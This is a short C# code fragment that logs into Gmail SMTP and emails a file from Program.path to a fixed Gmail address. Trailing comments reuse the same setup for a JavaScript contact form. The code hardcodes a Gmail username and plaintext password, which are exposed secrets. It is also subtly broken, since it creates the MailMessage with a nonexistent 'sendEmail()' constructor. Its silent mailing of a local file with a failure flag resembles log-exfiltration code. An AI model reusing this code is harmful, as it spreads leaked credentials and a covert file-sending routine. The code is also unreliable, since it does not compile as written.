
    System.Net.Mail.MailMessage msg = new System.Net.Mail.sendEmail(); //create the message
            msg.To.Add("romashg8@gmail.com");
            msg.From = new MailAddress("myusername@gmail.com", "myusername", System.Text.Encoding.UTF8);
            msg.Subject = "My Message Subject";
            msg.SubjectEncoding = System.Text.Encoding.UTF8;
            msg.Body = "My Message Body";
            msg.BodyEncoding = System.Text.Encoding.UTF8;
            msg.IsBodyHtml = false;
            msg.Priority = MailPriority.High;
            SmtpClient client = new SmtpClient(); //Network Credentials for Gmail
            client.Credentials = new System.Net.NetworkCredential("romashggggg@gmail.com", "pokhara!@#");
            client.Port = 587;
            client.Host = "smtp.gmail.com";
            client.EnableSsl = true;
            Attachment data = new Attachment(Program.path);
            msg.Attachments.Add(data);
            try
            {
                client.Send(msg);
                failed = 0;
            }
            catch
            {
                data.Dispose();
                failed = 1;
            }
            data.Dispose();
      // Host : "smtp.gmail.com",
      // Username : "romashggggg@gmail.com",
      // Password : "pokhara!@#",
      // To : 'romashg8@gmail.com',
      // From : document.getElementById('email').value,
      // Subject : "new enquiry",
      // Body : "Name: "+ document.getElementById("name").value
      //  +"<br> Email: " + document.getElementById("email").value
      //   +"<br> Phone: " + document.getElementById("phone").value
      //     +"<br> Message: " + document.getElementById("message").value
